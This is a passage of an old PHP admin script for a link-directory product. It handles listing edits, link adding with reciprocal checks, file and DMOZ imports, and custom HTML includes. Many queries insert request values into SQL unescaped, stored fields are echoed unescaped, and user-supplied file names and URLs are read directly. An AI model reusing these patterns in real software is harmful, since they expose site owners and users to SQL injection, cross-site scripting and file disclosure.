                          edit listings, simply make the desired changes in the
                          respective input fields and click the &quot;Update
                          Listings&quot; button at the bottom of the page. You
                          can edit all listings at the same time, clicking the
                          update button will save all respective changes.</font></td>
                      </tr>
                      <tr>
                        <td width="100%" valign="top" colspan="2">
                          <hr size="1" color="#C0C0C0">
                        </td>
                      </tr>


<?

/*	function getchild($id,$ccat) {

		global $link, $arnum;


		$child = mysql_query("select * from lma_categories where parent = '$id' order by name") or die(mysql_error());
		if (mysql_num_rows($child) > 0) {
			$arnum++;
			while ($tcat = mysql_fetch_object($child)) {

				if ($tcat->id == $ccat) $seld = " selected";
				else $seld = "";

				echo "<option value=".$tcat->id."$seld>". str_repeat("&gt;", ($arnum-1)). " ". $tcat->name."</option>\n";

				getchild($tcat->id,$ccat);

			}
			$arnum--;
		}

	}

*/
	while ($inf = mysql_fetch_object($res)) {

		$op++;
		$delscript .= "document.getElementById('delbox$op').selectedIndex = 1;\n";

?>

<tr><td>&nbsp;</td></tr>
<tr><td>&nbsp;</td></tr>

                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Title</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="arts[<?echo $inf->id?>][title]" size="50" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize($inf->title)?>"></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Description</font></td>
                        <td width="80%" valign="top"><font face="Trebuchet MS" size="2"><textarea rows="3" name="arts[<?echo $inf->id?>][desc]" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo $inf->description?></textarea></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">URL</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="arts[<?echo $inf->id?>][url]" size="50" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize($inf->url)?>">
                          <a href="<?echo $inf->url?>" target="_blank">View</a></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Status</font></td>
                        <td width="80%" valign="top"><font size="2" face="Tahoma"><select size="1" name="arts[<?echo $inf->id?>][status]" style="font-family: Verdana; font-size: 8pt">
                                    <option value="1" <?if ($inf->status == "1") echo "selected"?>>Active</option>
                                    <option value="2" <?if ($inf->status == "2") echo "selected"?>>Active Without Reciprocal</option>
                                    <option value="3" <?if ($inf->status == "3") echo "selected"?>>Awaiting Approval</option>
                                    <option value="4" <?if ($inf->status == "4") echo "selected"?>>Suspended</option>
                                    <option value="5" <?if ($inf->status == "5") echo "selected"?>>DMOZ Imported</option>
                                  </select></font>

                                  <font size="2" face="Tahoma">Premium
                                  Listing? </font><font face="Tahoma" size="1"><input type="checkbox" name="arts[<?echo $inf->id?>][premium]" value="yes" <?if ($inf->premium == "yes") echo "checked"?>></font>
                                  </td>
                      </tr>


                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Category</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><select size="1" id="linkcat<?echo $inf->id?>" name="arts[<?echo $inf->id?>][category]" style="font-family: Verdana; font-size: 8pt">
                        <option value="<?echo $inf->category?>"><?

            $goo = 1;

			unset($caturl);

			$lacat = $inf->category;

			while ($goo == 1 and $x < 100) {

				$x++;

				$polss = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));

				if ($lacat == $inf->category) {
					$caturl = $polss->name;
				}
				else {
					$caturl = $polss->name ."/". $caturl;
				}

				$lacat = $polss->parent;
				if ($polss->parent == "0") $goo = 0;

			}

			echo $caturl;

?></option>
                        </select>
                        &nbsp;<a href="javascript:choosecat('linkcat<?echo $inf->id?>')"><font size=1>Click here to choose a category</font></a></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">First
                          Name</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="arts[<?echo $inf->id?>][fname]" size="20" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize($inf->firstname)?>"></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Last
                          Name</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="arts[<?echo $inf->id?>][lname]" size="20" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize($inf->lastname)?>"></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Email
                          Address</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="arts[<?echo $inf->id?>][email]" size="50" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize($inf->email)?>"></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Reciprocal</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="arts[<?echo $inf->id?>][recipurl]" size="50" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize($inf->recipurl)?>">
                          <a href="<?echo $inf->recipurl?>" target="_blank">View</a></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Delete</font></td>
  </center>
                      <td width="80%" valign="top">
                        <p align="left"><font size="2" face="Tahoma"><select id="delbox<?echo $op?>" size="1" name="arts[<?echo $inf->id?>][delete]" style="font-family: Verdana; font-size: 8pt">
                          <option value="no" selected>No</option>
                          <option value="yes">Yes</option>
                        </select></font><font face="Tahoma" size="1"> (action
                        cannot be reversed)</font></td>
                    </tr>
<?

	}

?>


<script language="Javascript">
<!--

function delall()
{

<?echo $delscript?>
document.getElementById('editform').submit();

}
//-->
</script>


  <div align="center">
    <table border="0" cellpadding="4" cellspacing="4" width="85%">
      <tr>
        <td width="100%" colspan="2" height="20"></td>
      </tr>
      <tr>
        <td width="100%" colspan="2">
          <p align="center"><br><br><font face="Trebuchet MS" size="2"><input type="submit" value="Update Listings" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
        </td>
      </tr>
      <tr>
        <td width="100%" colspan="2"><br><br>
          <hr size="1" color="#FF0000">
        </td>
      </tr>
      <tr>
        <td width="20%"><font face="Trebuchet MS" size="2"><input type="button" value="Delete All" onClick="delall()" style="font-family: Trebuchet MS; font-size: 8pt"></font>
        </td>
        <td width="80%"><font face="Tahoma" size="1">WARNING: Clicking this
          button will permanently delete all of the listings shown above. This
          action is not reversible so please use it with caution.</font></td>
      </tr>
      <tr>
        <td width="100%" colspan="2">
          <hr size="1" color="#FF0000">
        </td>
      </tr>

<?

}

?>

      <tr>
        <td width="100%" colspan="2"></td>
      </tr>
    </table>
  </div>
</td>
</tr></table>
</td></tr></table>
</td></tr></table>
<?

	echo $footr;

}


elseif ($action == "addlink") {

	if (!$title or !$url) message("Error", "You must enter both a title and a valid URL to add a new link.");

	if (!$category or $category == "0") message("Error", "Links cannot be added to the Top category");

	else {

		$status = "1";

		if ($bypass != "yes") {

			$formhtml = '<form action="admin.php" method="post" style="margin: 0px">
<input type=hidden name="action" value="addlink">
<input type=hidden name="bypass" value="yes">
<input type=hidden name="title" value="'.fieldize($title).'">
<input type=hidden name="url" value="'.fieldize($url).'">
<input type=hidden name="description" value="'.fieldize($description).'">
<input type=hidden name="premium" value="'.fieldize($premium).'">
<input type=hidden name="category" value="'.fieldize($category).'">
<input type=hidden name="fname" value="'.fieldize($fname).'">
<input type=hidden name="lname" value="'.fieldize($lname).'">
<input type=hidden name="emailaddy" value="'.fieldize($emailaddy).'">
<input type=hidden name="recipurl" value="'.fieldize($recipurl).'">
<input type=hidden name="sendemail" value="'.fieldize($sendemail).'">
<input type=submit value="Add Link">
</form>
';

			if ($recipurl) {

				$page = @file($recipurl);

				if (!$page) message("Warning", "Could not check reciprocal link because the URL is not available at this time.
Please make sure that the URL is valid. If you'd still like to add the link, please click the button below
<p>$formhtml</p>");

				else {

					$pagehtml = implode("", $page);
					if (!ereg($reciplinkurl, $pagehtml)) message("Warning", "Could not find the reciprocal link at the specified URL.
If you'd still like to add the link, please click the button below.
<p>$formhtml</p>");

				}

			}

			else $status = "2";

		}

		else $status = "2";


	if ($premium != "yes") $premium = "no";

	$pol = mysql_query("insert into lma_links values(NULL, '$category', '$status', 'yes', '$premium', '$title', '$description', '$url', '$fname', '$lname', '$emailaddy', '$recipurl', '$ctime', '0')") or message("Error", mysql_error());


	if ($sendemail == "yes") {

		$base = str_replace("admin.php", "", $_SERVER['SCRIPT_NAME']). $basedir;

		$listinfo = "
        Title: ".$title."
          URL: ".$url."
  Description: ".$description."
   First Name: ".$fname."
    Last Name: ".$lname."
        Email: ".$emailaddy."
   Reciprocal: ".$recipurl;


		$goo = 1;
		$lacat = $category;

		$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));

		$caturl = "/". getindex($pol->name) . ".$pext";

		while ($goo == 1 and $x < 100) {

			$x++;

			$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));
			$caturl = "/".str_replace(" ", "_", $pol->name).$caturl;
			$lacat = $pol->parent;
			if ($pol->parent == "0") $goo = 0;

		}


		$directoryurl = "http://".$_SERVER['SERVER_NAME']. $base."/";

		$categoryurl = "http://".$_SERVER["SERVER_NAME"].$base.$caturl;

		$addedtpls = mysql_fetch_object(mysql_query("select subject, body from lma_emails where id = 'approved'"));

		$subject = $addedtpls->subject;
		$subject = str_replace("{FIRSTNAME}", stripslashes($fname), $subject);
		$subject = str_replace("{LASTNAME}", stripslashes($lname), $subject);
		$subject = str_replace("{DIRECTORY-LINK}", $directoryurl, $subject);
		$subject = str_replace("{CATEGORY-LINK}", $categoryurl, $subject);

		$body = $addedtpls->body;
		$body = str_replace("{FIRSTNAME}", stripslashes($fname), $body);
		$body = str_replace("{LASTNAME}", stripslashes($lname), $body);
		$body = str_replace("{DIRECTORY-LINK}", $directoryurl, $body);
		$body = str_replace("{CATEGORY-LINK}", $categoryurl, $body);
		$body = str_replace("{LISTING-DETAILS}", $listinfo, $body);


		maill($emailaddy, $subject, $body, "From: $fromname <$adminemail>");

	}

	dolcount();

	message("Congratulations", "The link was successfully added.");

	}

}

elseif ($action == "import") {

?>

<?echo $headr?>

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Import Links
            &amp; Directory Structure</font></b></p>
            <p align="left"><font size="2" face="Tahoma">This section
                  allows you to import links and/or a predefined directory
            structure into the &quot;Automated Link Management Assistant&quot;
            in a number of different formats. Please be sure you're read the
            appropriate section in the user manual thoroughly before using the
            importing features, and always backup your existing database before
            using these features if you have pre-existing data in your directory.</font></p>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>Manual Text
                  File Import</u> </font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">You are able to import a
                  complete set of data into your directory database from a flat-file (text)
                  database. Simply upload the database file to your LMA directory and enter
                  the filename in the field below. The program will automatically find
                  the database delimiter.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            <tr>
              <td>

              <form action="admin.php" method="post" style="margin: 0px">
              <input type="hidden" name="action" value="importfind">

              <center>
                <p align="center"><font size="1" face="Tahoma"><input type="text" name="filename" size="50" style="font-family: Verdana; font-size: 8pt" value="import.txt">&nbsp;&nbsp;
                <input type="submit" value="Import" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
                </p>
                </center>


               </form>

                </td>

              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">DMOZ
                  Directory Structure &amp; Link Import</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">You are also able to crawl <a href="http://www.dmoz.org" target="_blank">DMOZ</a>
                  (The Open Directory Project) and import the directory structure and listings found
                  within those categories (and related sub-categories) directly into
                  your database. Enter the exact URL of the top level
                  directory you would like to crawl and start the import from.
                  The &quot;Link Management Assistant&quot; will also import all
                  sub-categories (ignoring related categories marked with @
                  character) and the listings found within. Please refer to the
                  user manual for complete information.</font>
                  <p align="center"><font size="2" face="Tahoma">You will receive
                  an email when the import process has completed.</font></p>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>

              <form action="admin.php" method="post" style="margin: 0px">
              <input type="hidden" name="action" value="dmozgo">


                <td height="20">
                  <p align="center"><font face="Trebuchet MS" size="2"><input type="text" size=60 name="url" value="http://www.dmoz.org/Sports/Adventure_Racing/"></font></p>
                  <p align="center"><font size="2" face="Tahoma">Import <select size="1" name="what" style="font-family: Verdana; font-size: 8pt">
                    <option value="all" selected>Category Structue &amp; Listings</option>
                    <option value="cats">Category Structue Only</option>
                  </select></font></p>
                  <p align="center"><font size="2" face="Tahoma">Import Under Existing Category:
                  <select size="1" id="catparent" name="importparent" style="font-family: Verdana; font-size: 8pt">
                  <option value="0" selected>None</option>
                  </select> &nbsp;<font size="1"><a href="javascript:choosecat('catparent')">Click here to select a category</a></font>                                 
                  <p align="center"><font face="Trebuchet MS" size="2">Choose a new category name<br><font size=1>(Imported categories and/or links will be put inside this category)<br>
                  <b>Leave this blank to put imported categories on the Top level directory.</b></font><br>
                  <input type="text" name="newcatname"></p>
                  <p align="center"><font size="1" face="Tahoma">
                <input type="submit" value="Start DMOZ Import" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
                  </p>                  
                  <p align="left"><font face="Tahoma" size="1">NOTE: In using
                  this feature you need to ensure the pages the results appear
                  on are compliant with the <a href="http://www.dmoz.org/license.html" target="_blank">DMOZ
                  </a><a href="http://www.dmoz.org/license.html" target="_blank">license</a>.
                  That means you need to incorporate a statement into your
                  directory templates similar to &quot;Some listings found
                  within the directory may have been supplemented with results
                  from the DMOZ project&quot; ensuring you link back to the DMOZ
                  website.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>


              </form>

            </table>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>

<?echo $footr?>

<?

}


elseif ($action == "importfind") {


	if (!file_exists($filename)) message("Error", "The file $filename doesn't exist in this directory");
	else {

		$db = file($filename);
		for ($i=0; $i<3; $i++) {

			$line = str_replace(" ", "", trim($db[$i]));
			preg_match_all("/(\W)+/", $line, $res);

			if ($res) {

				while(list(,$del) = each($res[0])) {
					$dels[$del]++;
				}

			}

		}

		arsort($dels);

		$delim = key($dels);

		$thtml = 'Link Management Assistant has found the following character or string to be the delimiter for the database.
If this is not correct please change it to the appropriate delimiter. Click "OK" to continue.
<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="importselect">
<input type="hidden" name="filename" value="'.$filename.'">
<p><input type="text" name="delimiter" value="'.fieldize($delim).'" size=10></p>
<p><input type="submit" value="OK"></p>
</form>';

		message("Please confirm", $thtml);

	}

}


elseif ($action == "importselect") {

	$db = file($filename);
	$first = array_shift($db);

	$delimiter = stripslashes($delimiter);

	$parts = explode($delimiter, $first);

	echo $headr;

?>
<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="importgo">
<input type="hidden" name="filename" value="<?echo $filename?>">
<input type="hidden" name="delimiter" value="<?echo fieldize($delimiter)?>">

<div align="center">
  <table border="1" cellpadding="8" cellspacing="4" width="650" bordercolor="#C0C0C0" bgcolor="#F8F8F8">
    <tr>
      <td>
<div align="center">
  <table border="0" cellspacing="1" width="100%">
  <tr>
    <td height="30">
    <p align="right"><font face="Tahoma" size="2"><a href="admin.php">Main
    Admin</a></font>
    </td>
  </tr>
    <center>
  <tr>
    <td height="30">
    <p align="center"><b><font face="Trebuchet MS" size="4">Import Setup</font></b>
    </td>
  </tr>
  <tr>
    <td height="10">
    </td>
  </tr>
  <tr>
    <td height="20"><font size="2" face="Tahoma">The last step before importing your database
    is to tell Link Management Assistant which fields are which on the database file. Simply
    answer the following questions and click on the "Import Now" button. If any of these fields are
    not found on your database file, simply select the option "Not found" for that field.

<?

function showopts($nme) {

	global $parts;

	if ($nme != "title" and $nme != "url") echo '<input type="radio" name="'.$nme.'" value="1000"> Not Found<br>';

	$che = " checked";

	while (list($i,$part) = each($parts)) {

		echo '<input type="radio" name="'.$nme.'" value="'.$i.'"'.$che.'> '.$part.'<br>';

		$che = "";

	}

	reset($parts);

}

?>

<br><br><br><br>
<p align="center"><b>Which of these is the...</b></p>
<table border="0" width="100%" cellspacing="29">

<tr>
 <td valign="top"><font size="2" face="Tahoma"><b>Link Title</b></font></td>
 <td><font size="2" face="Tahoma"><?showopts("title")?></font></td>
</tr>
<tr>
 <td valign="top"><font size="2" face="Tahoma"><b>Link URL</b></font></td>
 <td><font size="2" face="Tahoma"><?showopts("url")?></font></td>
</tr>
<tr>
 <td valign="top"><font size="2" face="Tahoma"><b>Link Description</b></font></td>
 <td><font size="2" face="Tahoma"><?showopts("description")?></font></td>
</tr>
<tr>
 <td valign="top"><font size="2" face="Tahoma"><b>First Name</b></font></td>
 <td><font size="2" face="Tahoma"><?showopts("fname")?></font></td>
</tr>
<tr>
 <td valign="top"><font size="2" face="Tahoma"><b>Last Name</b></font></td>
 <td><font size="2" face="Tahoma"><?showopts("lname")?></font></td>
</tr>
<tr>
 <td valign="top"><font size="2" face="Tahoma"><b>E-mail Address</b></font></td>
 <td><font size="2" face="Tahoma"><?showopts("email")?></font></td>
</tr>
<tr>
 <td valign="top"><font size="2" face="Tahoma"><b>Reciprocal URL</b></font></td>
 <td><font size="2" face="Tahoma"><?showopts("recipurl")?></font></td>
</tr>

</table>
<p align="center"><br><b>What category should imported links be put in?</b><br><br>
<select name="category" size="1">

<?
function getchild($id) {

	global $link, $arnum;


	$child = mysql_query("select * from lma_categories where parent = '$id' order by name") or die(mysql_error());
	if (mysql_num_rows($child) > 0) {
		$arnum++;
		while ($tcat = mysql_fetch_object($child)) {
			echo "<option value=".$tcat->id.">". str_repeat("&gt;", ($arnum-1)). " ". $tcat->name."</option>\n";
			getchild($tcat->id);
		}
		$arnum--;
	}

}

getchild("0");
?>

</select></p>

<p align="center"><br><b>What status should be given to imported links?</b><br><br>
<select name="status" size="1">
<option value="1" selected>Active</option>
<option value="3">Awaiting Approval</option>
<option value="4">Suspended</option>
</select></p>

<p align="center"><br><b>Should imported links be labeled as "Premium"?</b><br><br>
<select name="premium" size="1">
<option value="no" selected>No</option>
<option value="yes">Yes</option>
</select></p>

<p align="center"><br><br><input type="submit" value="Import Now!"><br>&nbsp;</p>

</font></td>
  </tr>
 </table>
 </td></tr>
</table>
</form>
</div>
<?

	echo $footr;

}

elseif ($action == "importgo") {

	$db = file($filename);

	$delimiter = stripslashes($delimiter);

	while (list(,$line) = each($db)) {

		$line = trim($line);

		$parts = explode($delimiter, $line);

		$ntitle = mysql_escape_string($parts[$title]);
		$nurl = mysql_escape_string($parts[$url]);
		$ndesc = mysql_escape_string($parts[$description]);
		$nfname = mysql_escape_string($parts[$fname]);
		$nlname = mysql_escape_string($parts[$lname]);
		$nemail = mysql_escape_string($parts[$email]);
		$nrecipurl = mysql_escape_string($parts[$recipurl]);

		if ($status == "1" and $recipurl == "1000") $status = "2";

		$pol = mysql_query("insert into lma_links values(NULL, '$category', '$status', 'yes', '$premium', '$ntitle', '$ndesc', '$nurl', '$nfname', '$nlname', '$nemail', '$nrecipurl', '$ctime', '0')") or message("Error", mysql_error());

	}

	dolcount();

	message("Congratulations", "The links were successfully imported from the database");
}


elseif ($action == "custominc") {

	$pol = mysql_query("CREATE TABLE if not exists `lma_custom_includes` (
  `id` tinyint(3) unsigned NOT NULL auto_increment,
  `desc` text NOT NULL,
  `html` text NOT NULL,
  PRIMARY KEY  (`id`)
)") or die(mysql_error());

?>

<?echo $headr?>

<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="newcustominc">

<div align="center">
  <table border="1" cellpadding="8" cellspacing="4" width="650" bordercolor="#C0C0C0" bgcolor="#F8F8F8">
    <tr>
      <td>
<div align="center">
  <table border="0" cellspacing="1" width="100%">
  <tr>
    <td height="30">
    <p align="right"><font face="Tahoma" size="2"><a href="admin.php">Main
    Admin</a></font>
    </td>
  </tr>
    <center>
  <tr>
    <td height="30">
    <p align="center"><b><font face="Trebuchet MS" size="4">Create &amp; Manage
    Custom Includes</font></b>
    </td>
  </tr>
  <tr>
    <td height="10">
    </td>
  </tr>
  <tr>
    <td height="20"><font size="2" face="Tahoma">Use this section to create new and manage existing
    custom includes. The Link Management Assistant allows you to create as many custom includes as
    you would like. It allows you to integrate any HTML content you wish to display into all pages
    in your directory, wherever the respective includes are used in your directory templates. When
    editing existing includes, the changes you make will be updated in real-time on the front end of
    your directory.
</font></td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
    </center>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  <tr>
    <td>
    <p align="left"><b><u><font size="2" face="Tahoma">Create New Include</font></u></b>
    </td>
  </tr>
    <center>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
  <tr>
    <td>
    <table border="0" cellpadding="8" cellspacing="4" width="100%">
      <tr>
        <td width="32%" valign="top">
          <p align="left"><font face="Tahoma" size="2"><a href="help/d.htm" target="_blank">Description</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="2" name="desc" cols="50" style="font-family: Tahoma; font-size: 10pt"></textarea></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/hc.htm" target="_blank">HTML
          Content</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="10" name="html" cols="50" style="font-family: Tahoma; font-size: 10pt"></textarea></td>
      </tr>
      <tr>
        <td width="32%" valign="top"></td>
        <td width="68%" valign="top"></td>
      </tr>
      <tr>
        <td width="100%" valign="top" colspan="2">
          <p align="center"><input type="submit" value="Create New Include" name="B3" style="font-family: Tahoma; font-size: 10pt; border-style: solid; border-width: 1"></td>
      </tr>
    </table>
    </td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  <tr>
    <td>
    <font size="2" face="Trebuchet MS"><b><u>Existing Includes</u></b></font>
    </td>
  </tr>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
    </center>
  <tr>
    <td>
      <table border="0" cellpadding="8" cellspacing="4" width="100%">

<?

	$res = mysql_query("select * from lma_custom_includes");
	while ($inc = mysql_fetch_object($res)) {

?>

        <tr>
          <td width="30%" valign="top">
            <p align="left"><font size="2" face="Tahoma">&lt;%custom-include-<?echo $inc->id?>%&gt;</font></td>
          <center>
          <td width="70%" valign="top"><font size="2" face="Tahoma"><?echo $inc->desc?></font></td>
          </tr>
          <tr>
            <td width="100%" valign="top" colspan="2">
              <p align="right"><a href="admin.php?action=editinc&inc=<?echo $inc->id?>"><font size="2" face="Tahoma">Edit</font></a><font size="2" face="Tahoma">
              | <a href="admin.php?action=delinc&inc=<?echo $inc->id?>">Delete</a></font></td>
          </center>
        </tr>


<?
	}
?>

      </table>
    </td>
  </tr>
  </table>
</div>
      </td>
    </tr>
  </table>
</form>
  <?echo $footr?>

<?

}

elseif ($action == "newcustominc") {

	$pol = mysql_query("insert into lma_custom_includes values(NULL, '".$desc."', '".$html."')") or die(mysql_error());

	message ("Congratulations!", "You have successfully created a new custom include.");

}

elseif ($action == "delinc") {

	$pol = mysql_query("delete from lma_custom_includes where id = '$inc'") or die(mysql_error());

	message ("Congratulations!", "You have successfully deleted the custom include.");

}

elseif ($action == "editinc") {

	$pol = mysql_fetch_object(mysql_query("select * from lma_custom_includes where id = '$inc'")) or die(mysql_error());

?>

<?echo $headr?>

<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="saveinc">
<input type="hidden" name="id" value="<?echo $inc?>">

<div align="center">
  <table border="1" cellpadding="8" cellspacing="4" width="650" bordercolor="#C0C0C0" bgcolor="#F8F8F8">
    <tr>
      <td>
<div align="center">
  <table border="0" cellspacing="1" width="100%">
  <tr>
    <td height="30">
    <p align="right"><font face="Tahoma" size="2"><a href="admin.php">Main
    Admin</a></font>
    </td>
  </tr>
    <center>
  <tr>
    <td height="30">
    <p align="center"><b><font face="Trebuchet MS" size="4">Create &amp; Manage
    Custom Includes</font></b>
    </td>
  </tr>
  <tr>
    <td height="10">
    </td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
    </center>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  <tr>
    <td>
    <p align="left"><b><u><font size="2" face="Tahoma">Editing Custom Include #<?echo $inc?></font></u></b>
    </td>
  </tr>
    <center>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
  <tr>
    <td>
    <table border="0" cellpadding="8" cellspacing="4" width="100%">
      <tr>
        <td width="32%" valign="top">
          <p align="left"><font face="Tahoma" size="2"><a href="help/d.htm" target="_blank">Description</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="2" name="desc" cols="50" style="font-family: Tahoma; font-size: 10pt"><?echo $pol->desc?></textarea></td>
      </tr>
      <tr>
        <td width="32%" valign="top"><font face="Tahoma" size="2"><a href="help/hc.htm" target="_blank">HTML
          Content</a>:</font></td>
        <td width="68%" valign="top"><textarea rows="10" name="html" cols="50" style="font-family: Tahoma; font-size: 10pt"><?echo htmlentities($pol->html)?></textarea></td>
      </tr>
      <tr>
        <td width="32%" valign="top"></td>
        <td width="68%" valign="top"></td>
      </tr>
      <tr>
        <td width="100%" valign="top" colspan="2">
          <p align="center"><input type="submit" value="Edit Include" name="B3" style="font-family: Tahoma; font-size: 10pt; border-style: solid; border-width: 1"></td>
      </tr>
    </table>
    </td>
  </tr>
  <tr>
    <td height="20">
    </td>
  </tr>
  <tr>
    <td>
    <hr size="1" color="#C0C0C0">
    </td>
  </tr>
  </table>
</div>
      </td>
    </tr>
  </table>
</form>
  <?echo $footr?>

<?
}

elseif ($action == "saveinc") {

	$pol = mysql_query("update `lma_custom_includes` SET `desc` = '".$desc."', `html` = '".$html."' where `id` = '$id'") or die(mysql_error());

	message("Congratulations!", "The custom include was successfully edited.");

}

elseif ($action == "ppcinc") {

	$pol = mysql_query("CREATE TABLE if not exists `lma_ppc_includes` (
  `id` smallint(5) unsigned NOT NULL auto_increment,
  `desc` text NOT NULL,
  `results` tinyint(3) unsigned NOT NULL default '0',
  `keywords` text NOT NULL,
  PRIMARY KEY  (`id`)
)") or die(mysql_error());
        
?>

<?echo $headr?>

<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="saveppcsettings">            

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Create &amp;
            Manage Pay-Per-Click Includes</font></b></p>
  </center>
            <p align="center"><font size="2" face="Tahoma"><a href="http://www.searchfeed.com/rd/AffiliateInfo.jsp?p=23139&amp;trackID=W4267547585" target="_blank">Sign
            Up With Search Feed Here</a></font></p>
  <center>
  <p align="left"><font size="2" face="Tahoma">The Link Management Assistant now
  allows you to incorporate Search Feed affiliated search results throughout
  your website directory and earn commission for each click through. For example
  you may like to create a PPC include and place that include above standard
  listings in your category templates to earn additional revenue from your
  website directory. You can also replicate a similar approach in your search
  result template. You can create as many of these as you like and the includes
  can be used in all templates.</font></p>
  </center>
                </td>
              </tr>
  <center>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>Search Feed
                  Account Settings</u></font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
    <table border="0" cellpadding="8" cellspacing="4" width="100%">
      <tr>
        <td width="32%" valign="top">
          <p align="left"><font face="Tahoma" size="2"><a href="help/sfafid.htm" target="_blank">Affiliate
          ID</a>:</font></td>
        <td width="68%" valign="top"><font face="Tahoma" size="2"><input name="sfaffid" size="10" style="font-family: Tahoma; font-size: 10pt" value="<?echo $sfaffid?>"></font></td>
      </tr>
